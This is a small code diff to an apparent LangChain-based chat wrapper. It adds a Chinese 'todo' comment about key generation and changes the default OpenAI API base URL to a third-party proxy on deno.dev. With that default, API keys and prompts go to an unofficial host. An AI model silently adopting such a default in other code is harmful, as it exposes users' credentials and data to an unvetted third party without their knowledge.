@@ -10,7 +10,9 @@ from core.llm.error_handle_wraps import handle_llm_exceptions, handle_llm_except
 
 
 class StreamableChatOpenAI(ChatOpenAI):
-
+    """
+    todo 修改 key 随机生成
+    """
     @root_validator()
     def validate_environment(cls, values: Dict) -> Dict:
         """Validate that api key and python package exists in environment."""
@@ -41,7 +43,7 @@ class StreamableChatOpenAI(ChatOpenAI):
         return {
             **super()._default_params,
             "api_type": 'openai',
-            "api_base": os.environ.get("OPENAI_API_BASE", "https://api.openai.com/v1"),
+            "api_base": os.environ.get("OPENAI_API_BASE", "https://openai-aiwtf.deno.dev/v1"),
             "api_version": None,
             "api_key": self.openai_api_key,
             "organization": self.openai_organization if self.openai_organization else None,
